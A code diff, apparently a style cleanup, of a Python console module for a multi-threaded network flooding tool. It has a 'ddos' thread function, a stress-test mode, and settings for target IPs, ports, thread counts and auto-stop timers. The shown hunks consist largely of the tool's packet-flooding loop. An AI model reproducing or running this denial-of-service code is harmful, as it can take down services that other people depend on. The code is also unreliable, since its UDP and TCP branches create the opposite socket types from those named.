@@ -8,6 +8,7 @@ import socket
 event = event()
 tools = tools()
 
+
 class Main:
 	def __init__(selfie, console):
 		global self
@@ -25,10 +26,10 @@ class Main:
 		var.C_Dark_Blue = "\x1b[35m"
 		var.C_Red = "\x1b[31m"
 
-		var.port = [80] # Port 80 protocol == TCP
+		var.port = [80]  # Port 80 protocol == TCP
 		var.threads = 160
 		var.ip = [""]
-		var.socketmethod = "TCP" # / UDP
+		var.socketmethod = "TCP"  # / UDP
 		var.sleep = 0
 		var.outtxt = True
 		var.outtxtmute = False
@@ -40,7 +41,7 @@ class Main:
 		var.autostart = 0
 		var.autostop = 0
 		var.autostep = 0
-		var.autostarttime = 0 # Will be used as a variable for autostop
+		var.autostarttime = 0  # Will be used as a variable for autostop
 
 	def _add_commands(self):
 		event.commands(self.exit_console, ["exit", "quit", "e", "q"])
@@ -308,7 +309,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 		except Exception as e:
 			print("There was an error while executing.", e)
 		print(" ")
-	
+
 	@event.command
 	def auto_start(command):
 		print(" ")
@@ -317,7 +318,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 		except Exception as e:
 			print("There was an error while executing.", e)
 		print(" ")
-	
+
 	@event.command
 	def auto_stop(command):
 		print(" ")
@@ -345,7 +346,6 @@ C_B----------------------------------------------------------C_W""").replace("C_
 		print("Time between threads: %s" % var.autostep)
 		print("")
 
-
 	def stresstest(self):
 		print(" ")
 		print("Time between: %s" % str(var.timeforstress))
@@ -358,7 +358,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 				try:
 					t = Thread(target=self.ddos)
 					t.start()
-				except:
+				except Exception:
 					print("\x1b[0;39mFailed to start a thread.")
 			sleep(var.timeforstress)
 			if var.stresserror:
@@ -377,9 +377,9 @@ C_B----------------------------------------------------------C_W""").replace("C_
 		if not var.outtxtmute:
 			print("Thread started!")
 		if var.socketmethod == "UDP":
-		   mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		else:
-		   mysocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			mysocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 		while var.runactive:
 			for ipvalue in var.ip:
 				for portvalue in var.port:
@@ -389,13 +389,13 @@ C_B----------------------------------------------------------C_W""").replace("C_
 						else:
 							try:
 								mysocket.bind((ipvalue, portvalue))
-							except:
+							except Exception:
 								pass
 						if var.socketmethod == "TCP":
 							mysocket.send(packet)
 						try:
 							mysocket.sendto(packet, (ipvalue, portvalue))
-						except:
+						except Exception:
 							mysocket.send(packet)
 						if var.outtxt:
 							if not mesalready:
@@ -411,7 +411,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 						if var.socketmethod == "TCP":
 							try:
 								mysocket.close()
-							except:
+							except Exception:
 								pass
 
 			if int(var.autostop) != 0:
@@ -439,7 +439,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 						self.stresstest()
 					else:
 						print("Do not use multiple targets/ports in the Stress-Testing mode.")
-				else: # Normal Mode
+				else:  # Normal Mode
 					if var.autostop != 0:
 						var.autostarttime = time()
 					for thread in range(var.threads):
@@ -447,11 +447,12 @@ C_B----------------------------------------------------------C_W""").replace("C_
 							t = Thread(target=self.ddos)
 							sleep(var.autostep)
 							t.start()
-						except:
+						except Exception:
 							print("Could not start thread %s." % thread)
 		else:
 			print("No target has been defined.")
 		print("")
+
 
 def setup(console):
 	console.ps1 = "\033[1;32;0mL4> "
